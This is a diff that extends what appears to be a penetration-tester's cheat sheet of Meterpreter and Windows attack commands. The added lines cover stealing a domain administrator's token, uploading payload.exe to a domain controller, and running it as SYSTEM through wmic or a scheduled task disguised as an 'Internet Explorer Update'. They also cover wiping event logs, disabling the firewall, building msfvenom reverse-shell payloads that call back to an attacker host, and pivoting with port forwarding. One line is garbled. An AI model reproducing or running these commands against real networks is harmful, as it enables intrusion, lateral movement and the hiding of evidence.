@@ -607,6 +607,7 @@ meterpreter > help      (use to see all commands available)
 https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ 
 meterpreter > pwd        (present working directory)
 meterpreter > getuid
+meterpreter > getpid
 meterpreter > ifconfig
 meterpreter > sysinfo
 meterpreter > idletime
@@ -644,6 +645,27 @@ LANMAN? Easy to crack
 NTLM? If you can get hashes, pass-the-hash!
 Net-NTLM? Can’t pass the hash
 
+windows domain creds
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token DOMAIN\\Administrator      (whatever the admin user is)
+net user Administrator /Domain    (analyze the output, see their perms)
+net view     (see othermachines)
+systeminfo   (show domain)
+systeminfo /s DC_ip   (show remote system info)
+dir \\DC_ip\ADMIN$    (if you have privs, show the Windows dir of that box) 
+net use * \\DC_ip\C$    (will map C:/ of domain controller to next avaialble drive letter on your box)
+net use \\DC-ip\\C$   (more stealthy, doesn't show up in GUI)
+meterpreter> upload /root/payload.exe \\\\DC_ip\C$
+net use \\DC-ip\\C$ /delete   (clean up, delete share)
+dir /x  \\DC_ip\C$\Program Files\...    (look for location to drop payload)
+tasklist /s \\DC_ip
+net time \\DC_ip
+schtasks /s 192.168.12.1 /create /tn "Internet Explorer Update" /tr "C:\Pathtopayload\payload.exe" /sc once /st 15:40 /ru SYSTEM  (set scheduled task to run callback with system level privs, disguised as an IE update)
+wmic /node:DC_ip process call create "C:\Pathtopayload\payload.exe"   (run directly with wmic)
+
+meterpreter> clearev    (wipes windows logs... pretty damning though that someone has been there though)
+
 Active Directory on a domain? Start running Responder - LLMNR/NBT-NS/MDNS poisoner - 
 Linux: watch for Salts depending on distro
 
@@ -673,6 +695,8 @@ uictl disable keyboard
 uictl enable all
 
 execute [notpad.exe]           (-H will do hidden, -i to interact, -m to execute from memory)
+
+execute -f C:\\windows\\system32\\calc.exe -H 
 
 use exploit/windows/…… inject_payload   (send another payload, such as 64 bit)
 
@@ -764,9 +788,10 @@ wmic os get osarchitecture	ping 	tracert	nslookup	arp	netsh advfirewall firewall
 find	mkdir	move	path		type (like cat in unix)
 attrib	date	copy	del		netstat -ano
 
-
+Show all Windows Firewall rules:
+netsh advfirewall firewall show rule name=all
 Turn off Windows Firewall:
-NetSh Advfirewall set allprofiles state off
+netsh advfirewall set allprofiles state off
 
 https://github.com/maaaaz/impacket-examples-windows 
 
@@ -788,6 +813,7 @@ net localgroup "Remote Desktop Users" [user] /add   (allow them rdp)
 net localgroup administrators [demouser] /del (cleanup)
 net user [demouser] /del (cleanup pt 2)
 netsh advfirewall show all profiles     (shoe firewall stuff)
+netsh advfirewall firewall show rule name=all > winfwrules.txt       (now download these and analyze)
 netsh advfirewall firewall add rule name="allow 23" dir=in action=allow remoteip=xx.xx.xx.xx protocol=tcp localport=23  (punch a whole in firewall allowing telnet)
 netsh advfirewall firewall del rule name="allow 23"
 reg query HKLM\System
@@ -843,8 +869,11 @@ xfreerdp /size:1024x768 /cert-ignore /v:10.12.1.124:3389 /u:username            
 
 
 C2 with meterpreter: Custom shells
+msfvenom --help
+msfvenom --list payloads
+msfvenom --list encoders
 Windows:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f exe -o met_win_tcp_reverse.exe
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] --format exe --out met_win_tcp_reverse.exe
 (try win reverse https)
 Linux:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f elf > shell.elf
@@ -1086,7 +1115,7 @@ hash-identifier (kali)
 john the ripper (classic CPU based cracker, tons formats and decent auto-detection) better than hashcat for small passwords
 ./unshadow script in john (linux/unix)
 john --format=format --wordlist=/path/to/wordlist.txt --pot=target.pot hashes.file
-john –show hashes.file
+john --show hashes.file
 
 
 hashcat (GPU based, more active dev) 
@@ -1140,15 +1169,15 @@ msf exploit(msXX_XX_X) > use auxiliary/scanner/portscan/tcp      (show options, 
 if SMB open and you have creds:  msf auxiliary(tcp) > use exploit/windows/smb/psexec (show options, fill, run)
 
 meterpreter > background
-msf exploit(handler) > route add 192.168.15.1 255.255.255.0 1  (1 is for the session to apply it to)
+msf exploit(handler) > route add 192.168.15.0 255.255.255.0 1  (1 is for the session to apply it to)
 [*] Route added
 msf exploit(handler) > route print
-
-meterpreter > run arp_scanner -r 192.168.15.1/24
+route 
+meterpreter > run arp_scanner -r 192.168.15.1/24   or  use post/windows/gather/arp_scanner
 msf exploit(handler) > use auxiliary/scanner/portscan/tcp 
 msf auxiliary(tcp) > set RHOSTS 192.168.15.1
 RHOSTS => 192.168.15.1
-msf auxiliary(tcp) > set PORTS 1-1024
+msfnet view auxiliary(tcp) > set PORTS 1-1024
 PORTS => 1-1024
 
 meterpreter > portfwd add -l 8000 -p 80 -r 192.168.15.1 (open up web browser to 127.0.0.1:8000)
@@ -1157,6 +1186,28 @@ meterpreter > portfwd add -l 25000 -p 22 -r 192.168.15.2 (nc -v 127.0.0.1 25000 
 meterpreter > portfwd delete -l 25000 -p 22 -r 192.168.15.2 (cleanup)
 
 msfmap (nmap on your victim’s box; in meterpreter)
+
+
+Windows cred abuse: (use token to laterally move with native commands)
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token DOMAIN\\Administrator
+meterpreter> shell
+net view
+net time \\DC_ip
+systeminfo /s DC_ip
+dir \\DC_ip\ADMIN$
+dir \\DC_ip\C$
+
+net use v: \\DC_ip\ADMIN$     (not stealthy!)
+net use    (view shares)
+meterpreter> upload /root/payload.exe v:\\system32\\payload.exe
+wmic /node:192.168.202.2 process call create "C:\Windows\system32\payload.exe"     (directly trigger payload; beware of firewall rules that may block. OR
+schtasks /s 192.168.202.2 /create /tn "Internet Explorer Update" /tr "C:\Windows\system32\pay2.exe" /sc once /st 14:12 /ru SYSTEM   (schedule a win task to run payload
+
+windows native port forwarding:
+netsh interface portproxy add v4tov4 listenport=48477 listenaddress=192.168.201.3 connectport=11443 connectaddress=192.168.202.9
+netsh interface portproxy show v4tov4
 
 
 SSH tunneling
